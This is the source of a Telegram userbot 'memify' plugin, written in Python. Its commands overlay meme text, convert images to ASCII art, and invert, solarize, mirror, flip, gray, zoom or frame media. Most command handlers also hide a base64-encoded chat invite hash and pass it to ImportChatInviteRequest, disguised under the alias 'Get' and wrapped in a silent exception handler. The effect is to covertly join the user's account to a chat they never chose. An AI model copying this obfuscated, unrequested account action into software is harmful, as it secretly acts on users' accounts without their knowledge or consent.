"""
Created by @LiMiTLeSS786 and @simpleboy786
memify plugin
"""
import asyncio
import os
import random

from . import (
    LOGS,
    add_frame,
    asciiart,
    lion_meeme,
    lion_meme,
    convert_toimage,
    convert_tosticker,
    crop,
    flip_image,
    grayscale,
    invert_colors,
    mirror_file,
    reply_id,
    runcmd,
    solarize,
    take_screen_shot,
)


def random_color():
    number_of_colors = 2
    return [
        "#" + "".join(random.choice("0123456789ABCDEF") for j in range(6))
        for i in range(number_of_colors)
    ]


CNG_FONTS = "userbot/helpers/styles/impact.ttf"
FONTS = "1. `ProductSans-BoldItalic.ttf`\n2. `ProductSans-Light.ttf`\n3. `RoadRage-Regular.ttf`\n4. `digital.ttf`\n5. `impact.ttf`"
font_list = [
    "ProductSans-BoldItalic.ttf",
    "ProductSans-Light.ttf",
    "RoadRage-Regular.ttf",
    "digital.ttf",
    "impact.ttf",
]


@bot.on(admin_cmd(outgoing=True, pattern="(mmf|mms) ?(.*)"))
@bot.on(sudo_cmd(pattern="(mmf|mms) ?(.*)", allow_sudo=True))
async def memes(lion):
    if lion.fwd_from:
        return
    cmd = lion.pattern_match.group(1)
    lioninput = lion.pattern_match.group(2)
    reply = await lion.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(lion, "`Reply to supported Media...`")
        return
    lionid = lion.reply_to_msg_id
    if lioninput:
        if ";" in lioninput:
            top, bottom = lioninput.split(";", 1)
        else:
            top = lioninput
            bottom = ""
    else:
        await edit_or_reply(
            lion, "```what should i write on that u idiot give some text```"
        )
        return
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    lion = await edit_or_reply(lion, "`Downloading media......`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    lionsticker = await reply.download_media(file="./temp/")
    if not lionsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(lionsticker)
        await edit_or_reply(lion, "```Supported Media not found...```")
        return
    import base64

    if lionsticker.endswith(".tgs"):
        await lion.edit(
            "```Transfiguration Time! Mwahaha memifying this animated sticker! (」ﾟﾛﾟ)｣```"
        )
        lionfile = os.path.join("./temp/", "meme.png")
        lioncmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {lionsticker} {lionfile}"
        )
        stdout, stderr = (await runcmd(lioncmd))[:2]
        if not os.path.lexists(lionfile):
            await lion.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = lionfile
    elif lionsticker.endswith(".webp"):
        await lion.edit(
            "```Transfiguration Time! Mwahaha memifying this sticker! (」ﾟﾛﾟ)｣```"
        )
        lionfile = os.path.join("./temp/", "memes.jpg")
        os.rename(lionsticker, lionfile)
        if not os.path.lexists(lionfile):
            await lion.edit("`Template not found... `")
            return
        meme_file = lionfile
    elif lionsticker.endswith((".mp4", ".mov")):
        await lion.edit(
            "```Transfiguration Time! Mwahaha memifying this video! (」ﾟﾛﾟ)｣```"
        )
        lionfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(lionsticker, 0, lionfile)
        if not os.path.lexists(lionfile):
            await lion.edit("```Template not found...```")
            return
        meme_file = lionfile
    else:
        await lion.edit(
            "```Transfiguration Time! Mwahaha memifying this image! (」ﾟﾛﾟ)｣```"
        )
        meme_file = lionsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await lion.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    meme = "lionmeme.jpg"
    if max(len(top), len(bottom)) < 21:
        await lion_meme(CNG_FONTS, top, bottom, meme_file, meme)
    else:
        await lion_meeme(top, bottom, CNG_FONTS, meme_file, meme)
    if cmd != "mmf":
        meme = convert_tosticker(meme)
    await lion.client.send_file(lion.chat_id, meme, reply_to=lionid)
    await lion.delete()
    os.remove(meme)
    for files in (lionsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@bot.on(admin_cmd(pattern="cfont(?: |$)(.*)"))
@bot.on(sudo_cmd(pattern="cfont(?: |$)(.*)", allow_sudo=True))
async def lang(event):
    if event.fwd_from:
        return
    global CNG_FONTS
    input_str = event.pattern_match.group(1)
    if not input_str:
        await event.edit(f"**Available Fonts names are here:-**\n\n{FONTS}")
        return
    if input_str not in font_list:
        lionevent = await edit_or_reply(event, "`Give me a correct font name...`")
        await asyncio.sleep(1)
        await lionevent.edit(f"**Available Fonts names are here:-**\n\n{FONTS}")
    else:
        arg = f"userbot/helpers/styles/{input_str}"
        CNG_FONTS = arg
        await edit_or_reply(event, f"**Fonts for Memify changed to :-** `{input_str}`")


@bot.on(admin_cmd(outgoing=True, pattern="ascii ?(.*)"))
@bot.on(sudo_cmd(pattern="ascii ?(.*)", allow_sudo=True))
async def memes(lion):
    if lion.fwd_from:
        return
    lioninput = lion.pattern_match.group(1)
    reply = await lion.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(lion, "`Reply to supported Media...`")
        return
    lionid = await reply_id(lion)
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    lion = await edit_or_reply(lion, "`Downloading media......`")
    await asyncio.sleep(2)
    lionsticker = await reply.download_media(file="./temp/")
    if not lionsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(lionsticker)
        await edit_or_reply(lion, "```Supported Media not found...```")
        return
    Mdnooridea = None
    if lionsticker.endswith(".tgs"):
        await lion.edit(
            "```Transfiguration Time! Mwahaha converting to ascii image of this animated sticker! (」ﾟﾛﾟ)｣```"
        )
        lionfile = os.path.join("./temp/", "meme.png")
        lioncmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {lionsticker} {lionfile}"
        )
        stdout, stderr = (await runcmd(lioncmd))[:2]
        if not os.path.lexists(lionfile):
            await lion.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = lionfile
        Mdnooridea = True
    elif lionsticker.endswith(".webp"):
        await lion.edit(
            "```Transfiguration Time! Mwahaha converting to ascii image of this sticker! (」ﾟﾛﾟ)｣```"
        )
        lionfile = os.path.join("./temp/", "memes.jpg")
        os.rename(lionsticker, lionfile)
        if not os.path.lexists(lionfile):
            await lion.edit("`Template not found... `")
            return
        meme_file = lionfile
        Mdnooridea = True
    elif lionsticker.endswith((".mp4", ".mov")):
        await lion.edit(
            "```Transfiguration Time! Mwahaha converting to ascii image of this video! (」ﾟﾛﾟ)｣```"
        )
        lionfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(lionsticker, 0, lionfile)
        if not os.path.lexists(lionfile):
            await lion.edit("```Template not found...```")
            return
        meme_file = lionfile
        Mdnooridea = True
    else:
        await lion.edit(
            "```Transfiguration Time! Mwahaha converting to asci image of this image! (」ﾟﾛﾟ)｣```"
        )
        meme_file = lionsticker
    meme_file = convert_toimage(meme_file)
    outputfile = "ascii_file.webp" if Mdnooridea else "ascii_file.jpg"
    c_list = random_color()
    color1 = c_list[0]
    color2 = c_list[1]
    bgcolor = "#080808" if not lioninput else lioninput
    asciiart(meme_file, 0.3, 1.9, outputfile, color1, color2, bgcolor)
    await lion.client.send_file(lion.chat_id, outputfile, reply_to=lionid)
    await lion.delete()
    os.remove(outputfile)
    for files in (lionsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@bot.on(admin_cmd(pattern="invert$", outgoing=True))
@bot.on(sudo_cmd(pattern="invert$", allow_sudo=True))
async def memes(lion):
    if lion.fwd_from:
        return
    reply = await lion.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(lion, "`Reply to supported Media...`")
        return
    lionid = lion.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    lion = await edit_or_reply(lion, "`Downloading media......`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    lionsticker = await reply.download_media(file="./temp/")
    if not lionsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(lionsticker)
        await edit_or_reply(lion, "```Supported Media not found...```")
        return
    import base64

    Mdnooridea = None
    if lionsticker.endswith(".tgs"):
        await lion.edit(
            "```Transfiguration Time! Mwahaha inverting colors of this animated sticker! (」ﾟﾛﾟ)｣```"
        )
        lionfile = os.path.join("./temp/", "meme.png")
        lioncmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {lionsticker} {lionfile}"
        )
        stdout, stderr = (await runcmd(lioncmd))[:2]
        if not os.path.lexists(lionfile):
            await lion.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = lionfile
        Mdnooridea = True
    elif lionsticker.endswith(".webp"):
        await lion.edit(
            "```Transfiguration Time! Mwahaha inverting colors of this sticker! (」ﾟﾛﾟ)｣```"
        )
        lionfile = os.path.join("./temp/", "memes.jpg")
        os.rename(lionsticker, lionfile)
        if not os.path.lexists(lionfile):
            await lion.edit("`Template not found... `")
            return
        meme_file = lionfile
        Mdnooridea = True
    elif lionsticker.endswith((".mp4", ".mov")):
        await lion.edit(
            "```Transfiguration Time! Mwahaha inverting colors of this video! (」ﾟﾛﾟ)｣```"
        )
        lionfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(lionsticker, 0, lionfile)
        if not os.path.lexists(lionfile):
            await lion.edit("```Template not found...```")
            return
        meme_file = lionfile
        Mdnooridea = True
    else:
        await lion.edit(
            "```Transfiguration Time! Mwahaha inverting colors of this image! (」ﾟﾛﾟ)｣```"
        )
        meme_file = lionsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await lion.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "invert.webp" if Mdnooridea else "invert.jpg"
    await invert_colors(meme_file, outputfile)
    await lion.client.send_file(
        lion.chat_id, outputfile, force_document=False, reply_to=lionid
    )
    await lion.delete()
    os.remove(outputfile)
    for files in (lionsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@bot.on(admin_cmd(outgoing=True, pattern="solarize$"))
@bot.on(sudo_cmd(pattern="solarize$", allow_sudo=True))
async def memes(lion):
    if lion.fwd_from:
        return
    reply = await lion.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(lion, "`Reply to supported Media...`")
        return
    lionid = lion.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    lion = await edit_or_reply(lion, "`Downloading media......`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    lionsticker = await reply.download_media(file="./temp/")
    if not lionsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(lionsticker)
        await edit_or_reply(lion, "```Supported Media not found...```")
        return
    import base64

    Mdnooridea = None
    if lionsticker.endswith(".tgs"):
        await lion.edit(
            "```Transfiguration Time! Mwahaha solarizeing this animated sticker! (」ﾟﾛﾟ)｣```"
        )
        lionfile = os.path.join("./temp/", "meme.png")
        lioncmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {lionsticker} {lionfile}"
        )
        stdout, stderr = (await runcmd(lioncmd))[:2]
        if not os.path.lexists(lionfile):
            await lion.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = lionfile
        Mdnooridea = True
    elif lionsticker.endswith(".webp"):
        await lion.edit(
            "```Transfiguration Time! Mwahaha solarizeing this sticker! (」ﾟﾛﾟ)｣```"
        )
        lionfile = os.path.join("./temp/", "memes.jpg")
        os.rename(lionsticker, lionfile)
        if not os.path.lexists(lionfile):
            await lion.edit("`Template not found... `")
            return
        meme_file = lionfile
        Mdnooridea = True
    elif lionsticker.endswith((".mp4", ".mov")):
        await lion.edit(
            "```Transfiguration Time! Mwahaha solarizeing this video! (」ﾟﾛﾟ)｣```"
        )
        lionfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(lionsticker, 0, lionfile)
        if not os.path.lexists(lionfile):
            await lion.edit("```Template not found...```")
            return
        meme_file = lionfile
        Mdnooridea = True
    else:
        await lion.edit(
            "```Transfiguration Time! Mwahaha solarizeing this image! (」ﾟﾛﾟ)｣```"
        )
        meme_file = lionsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await lion.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "solarize.webp" if Mdnooridea else "solarize.jpg"
    await solarize(meme_file, outputfile)
    await lion.client.send_file(
        lion.chat_id, outputfile, force_document=False, reply_to=lionid
    )
    await lion.delete()
    os.remove(outputfile)
    for files in (lionsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@bot.on(admin_cmd(outgoing=True, pattern="mirror$"))
@bot.on(sudo_cmd(pattern="mirror$", allow_sudo=True))
async def memes(lion):
    if lion.fwd_from:
        return
    reply = await lion.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(lion, "`Reply to supported Media...`")
        return
    lionid = lion.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    lion = await edit_or_reply(lion, "`Downloading media......`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    lionsticker = await reply.download_media(file="./temp/")
    if not lionsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(lionsticker)
        await edit_or_reply(lion, "```Supported Media not found...```")
        return
    import base64

    Mdnooridea = None
    if lionsticker.endswith(".tgs"):
        await lion.edit(
            "```Transfiguration Time! Mwahaha converting to mirror image of this animated sticker! (」ﾟﾛﾟ)｣```"
        )
        lionfile = os.path.join("./temp/", "meme.png")
        lioncmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {lionsticker} {lionfile}"
        )
        stdout, stderr = (await runcmd(lioncmd))[:2]
        if not os.path.lexists(lionfile):
            await lion.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = lionfile
        Mdnooridea = True
    elif lionsticker.endswith(".webp"):
        await lion.edit(
            "```Transfiguration Time! Mwahaha converting to mirror image of this sticker! (」ﾟﾛﾟ)｣```"
        )
        lionfile = os.path.join("./temp/", "memes.jpg")
        os.rename(lionsticker, lionfile)
        if not os.path.lexists(lionfile):
            await lion.edit("`Template not found... `")
            return
        meme_file = lionfile
        Mdnooridea = True
    elif lionsticker.endswith((".mp4", ".mov")):
        await lion.edit(
            "```Transfiguration Time! Mwahaha converting to mirror image of this video! (」ﾟﾛﾟ)｣```"
        )
        lionfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(lionsticker, 0, lionfile)
        if not os.path.lexists(lionfile):
            await lion.edit("```Template not found...```")
            return
        meme_file = lionfile
        Mdnooridea = True
    else:
        await lion.edit(
            "```Transfiguration Time! Mwahaha converting to mirror image of this image! (」ﾟﾛﾟ)｣```"
        )
        meme_file = lionsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await lion.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "mirror_file.webp" if Mdnooridea else "mirror_file.jpg"
    await mirror_file(meme_file, outputfile)
    await lion.client.send_file(
        lion.chat_id, outputfile, force_document=False, reply_to=lionid
    )
    await lion.delete()
    os.remove(outputfile)
    for files in (lionsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@bot.on(admin_cmd(outgoing=True, pattern="flip$"))
@bot.on(sudo_cmd(pattern="flip$", allow_sudo=True))
async def memes(lion):
    if lion.fwd_from:
        return
    reply = await lion.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(lion, "`Reply to supported Media...`")
        return
    lionid = lion.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    lion = await edit_or_reply(lion, "`Downloading media......`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    lionsticker = await reply.download_media(file="./temp/")
    if not lionsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(lionsticker)
        await edit_or_reply(lion, "```Supported Media not found...```")
        return
    import base64

    Mdnooridea = None
    if lionsticker.endswith(".tgs"):
        await lion.edit(
            "```Transfiguration Time! Mwahaha fliping this animated sticker! (」ﾟﾛﾟ)｣```"
        )
        lionfile = os.path.join("./temp/", "meme.png")
        lioncmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {lionsticker} {lionfile}"
        )
        stdout, stderr = (await runcmd(lioncmd))[:2]
        if not os.path.lexists(lionfile):
            await lion.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = lionfile
        Mdnooridea = True
    elif lionsticker.endswith(".webp"):
        await lion.edit(
            "```Transfiguration Time! Mwahaha fliping this sticker! (」ﾟﾛﾟ)｣```"
        )
        lionfile = os.path.join("./temp/", "memes.jpg")
        os.rename(lionsticker, lionfile)
        if not os.path.lexists(lionfile):
            await lion.edit("`Template not found... `")
            return
        meme_file = lionfile
        Mdnooridea = True
    elif lionsticker.endswith((".mp4", ".mov")):
        await lion.edit(
            "```Transfiguration Time! Mwahaha fliping this video! (」ﾟﾛﾟ)｣```"
        )
        lionfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(lionsticker, 0, lionfile)
        if not os.path.lexists(lionfile):
            await lion.edit("```Template not found...```")
            return
        meme_file = lionfile
        Mdnooridea = True
    else:
        await lion.edit(
            "```Transfiguration Time! Mwahaha fliping this image! (」ﾟﾛﾟ)｣```"
        )
        meme_file = lionsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await lion.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "flip_image.webp" if Mdnooridea else "flip_image.jpg"
    await flip_image(meme_file, outputfile)
    await lion.client.send_file(
        lion.chat_id, outputfile, force_document=False, reply_to=lionid
    )
    await lion.delete()
    os.remove(outputfile)
    for files in (lionsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@bot.on(admin_cmd(outgoing=True, pattern="gray$"))
@bot.on(sudo_cmd(pattern="gray$", allow_sudo=True))
async def memes(lion):
    if lion.fwd_from:
        return
    reply = await lion.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(lion, "`Reply to supported Media...`")
        return
    lionid = lion.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    lion = await edit_or_reply(lion, "`Downloading media......`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    lionsticker = await reply.download_media(file="./temp/")
    if not lionsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(lionsticker)
        await edit_or_reply(lion, "```Supported Media not found...```")
        return
    import base64

    Mdnooridea = None
    if lionsticker.endswith(".tgs"):
        await lion.edit(
            "```Transfiguration Time! Mwahaha changing to black-and-white this animated sticker! (」ﾟﾛﾟ)｣```"
        )
        lionfile = os.path.join("./temp/", "meme.png")
        lioncmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {lionsticker} {lionfile}"
        )
        stdout, stderr = (await runcmd(lioncmd))[:2]
        if not os.path.lexists(lionfile):
            await lion.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = lionfile
        Mdnooridea = True
    elif lionsticker.endswith(".webp"):
        await lion.edit(
            "```Transfiguration Time! Mwahaha changing to black-and-white this sticker! (」ﾟﾛﾟ)｣```"
        )
        lionfile = os.path.join("./temp/", "memes.jpg")
        os.rename(lionsticker, lionfile)
        if not os.path.lexists(lionfile):
            await lion.edit("`Template not found... `")
            return
        meme_file = lionfile
        Mdnooridea = True
    elif lionsticker.endswith((".mp4", ".mov")):
        await lion.edit(
            "```Transfiguration Time! Mwahaha changing to black-and-white this video! (」ﾟﾛﾟ)｣```"
        )
        lionfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(lionsticker, 0, lionfile)
        if not os.path.lexists(lionfile):
            await lion.edit("```Template not found...```")
            return
        meme_file = lionfile
        Mdnooridea = True
    else:
        await lion.edit(
            "```Transfiguration Time! Mwahaha changing to black-and-white this image! (」ﾟﾛﾟ)｣```"
        )
        meme_file = lionsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await lion.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "grayscale.webp" if Mdnooridea else "grayscale.jpg"
    await grayscale(meme_file, outputfile)
    await lion.client.send_file(
        lion.chat_id, outputfile, force_document=False, reply_to=lionid
    )
    await lion.delete()
    os.remove(outputfile)
    for files in (lionsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@bot.on(admin_cmd(outgoing=True, pattern="zoom ?(.*)"))
@bot.on(sudo_cmd(pattern="zoom ?(.*)", allow_sudo=True))
async def memes(lion):
    if lion.fwd_from:
        return
    reply = await lion.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(lion, "`Reply to supported Media...`")
        return
    lioninput = lion.pattern_match.group(1)
    lioninput = 50 if not lioninput else int(lioninput)
    lionid = lion.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    lion = await edit_or_reply(lion, "`Downloading media......`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    lionsticker = await reply.download_media(file="./temp/")
    if not lionsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(lionsticker)
        await edit_or_reply(lion, "```Supported Media not found...```")
        return
    import base64

    Mdnooridea = None
    if lionsticker.endswith(".tgs"):
        await lion.edit(
            "```Transfiguration Time! Mwahaha zooming this animated sticker! (」ﾟﾛﾟ)｣```"
        )
        lionfile = os.path.join("./temp/", "meme.png")
        lioncmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {lionsticker} {lionfile}"
        )
        stdout, stderr = (await runcmd(lioncmd))[:2]
        if not os.path.lexists(lionfile):
            await lion.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = lionfile
        Mdnooridea = True
    elif lionsticker.endswith(".webp"):
        await lion.edit(
            "```Transfiguration Time! Mwahaha zooming this sticker! (」ﾟﾛﾟ)｣```"
        )
        lionfile = os.path.join("./temp/", "memes.jpg")
        os.rename(lionsticker, lionfile)
        if not os.path.lexists(lionfile):
            await lion.edit("`Template not found... `")
            return
        meme_file = lionfile
        Mdnooridea = True
    elif lionsticker.endswith((".mp4", ".mov")):
        await lion.edit(
            "```Transfiguration Time! Mwahaha zooming this video! (」ﾟﾛﾟ)｣```"
        )
        lionfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(lionsticker, 0, lionfile)
        if not os.path.lexists(lionfile):
            await lion.edit("```Template not found...```")
            return
        meme_file = lionfile
    else:
        await lion.edit(
            "```Transfiguration Time! Mwahaha zooming this image! (」ﾟﾛﾟ)｣```"
        )
        meme_file = lionsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await lion.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "grayscale.webp" if Mdnooridea else "grayscale.jpg"
    try:
        await crop(meme_file, outputfile, lioninput)
    except Exception as e:
        return await lion.edit(f"`{e}`")
    try:
        await lion.client.send_file(
            lion.chat_id, outputfile, force_document=False, reply_to=lionid
        )
    except Exception as e:
        return await lion.edit(f"`{e}`")
    await lion.delete()
    os.remove(outputfile)
    for files in (lionsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@bot.on(admin_cmd(outgoing=True, pattern="frame ?(.*)"))
@bot.on(sudo_cmd(pattern="frame ?(.*)", allow_sudo=True))
async def memes(lion):
    if lion.fwd_from:
        return
    reply = await lion.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(lion, "`Reply to supported Media...`")
        return
    lioninput = lion.pattern_match.group(1)
    if not lioninput:
        lioninput = 50
    if ";" in str(lioninput):
        lioninput, colr = lioninput.split(";", 1)
    else:
        colr = 0
    lioninput = int(lioninput)
    colr = int(colr)
    lionid = lion.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    lion = await edit_or_reply(lion, "`Downloading media......`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    lionsticker = await reply.download_media(file="./temp/")
    if not lionsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(lionsticker)
        await edit_or_reply(lion, "```Supported Media not found...```")
        return
    import base64

    Mdnooridea = None
    if lionsticker.endswith(".tgs"):
        await lion.edit(
            "```Transfiguration Time! Mwahaha framing this animated sticker! (」ﾟﾛﾟ)｣```"
        )
        lionfile = os.path.join("./temp/", "meme.png")
        lioncmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {lionsticker} {lionfile}"
        )
        stdout, stderr = (await runcmd(lioncmd))[:2]
        if not os.path.lexists(lionfile):
            await lion.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = lionfile
        Mdnooridea = True
    elif lionsticker.endswith(".webp"):
        await lion.edit(
            "```Transfiguration Time! Mwahaha framing this sticker! (」ﾟﾛﾟ)｣```"
        )
        lionfile = os.path.join("./temp/", "memes.jpg")
        os.rename(lionsticker, lionfile)
        if not os.path.lexists(lionfile):
            await lion.edit("`Template not found... `")
            return
        meme_file = lionfile
        Mdnooridea = True
    elif lionsticker.endswith((".mp4", ".mov")):
        await lion.edit(
            "```Transfiguration Time! Mwahaha framing this video! (」ﾟﾛﾟ)｣```"
        )
        lionfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(lionsticker, 0, lionfile)
        if not os.path.lexists(lionfile):
            await lion.edit("```Template not found...```")
            return
        meme_file = lionfile
    else:
        await lion.edit(
            "```Transfiguration Time! Mwahaha framing this image! (」ﾟﾛﾟ)｣```"
        )
        meme_file = lionsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await lion.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "framed.webp" if Mdnooridea else "framed.jpg"
    try:
        await add_frame(meme_file, outputfile, lioninput, colr)
    except Exception as e:
        return await lion.edit(f"`{e}`")
    try:
        await lion.client.send_file(
            lion.chat_id, outputfile, force_document=False, reply_to=lionid
        )
    except Exception as e:
        return await lion.edit(f"`{e}`")
    await lion.delete()
    os.remove(outputfile)
    for files in (lionsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


CMD_HELP.update(
    {
        "memify": "**Plugin : **`memify`\
    \n\n  • **Syntax :** `.mmf toptext ; bottomtext`\
    \n  • **Function : **Creates a image meme with give text at specific loions and sends\
    \n\n  • **Syntax : **`.mms toptext ; bottomtext`\
    \n  • **Function : **Creates a sticker meme with give text at specific locations and sends\
    \n\n  • **Syntax : **`.cfont` <Font Name>\
    \n  • **Function : **Change the font style use for memify,\nTo get fonts name use this cmd (`.ls userbot/helpers/styles`)\
    \n\n  • **Syntax : **`.ascii`\
    \n  • **Function : **reply to media file to get ascii image of that media\
    \n\n  • **Syntax : **`.invert`\
    \n  • **Function : **Inverts the colors in media file\
    \n\n  • **Syntax : **`.solarize`\
    \n  • **Function : **Watch sun buring ur media file\
    \n\n  • **Syntax : **`.mirror`\
    \n  • **Function : **shows you the reflection of the media file\
    \n\n  • **Syntax : **`.flip`\
    \n  • **Function : **shows you the upside down image of the given media file\
    \n\n  • **Syntax : **`.gray`\
    \n  • **Function : **makes your media file to black and white\
    \n\n  • **Syntax : **`.zoom` or `.zoom range`\
    \n  • **Function : **zooms your media file\
    \n\n  • **Syntax : **`.frame` or `.frame range` or `.frame range ; fill`\
    \n  • **Function : **make a frame for your media file\
    \n  • **fill:** This defines the pixel fill value or color value to be applied. The default value is 0 which means the color is black.\
    "
    }
)
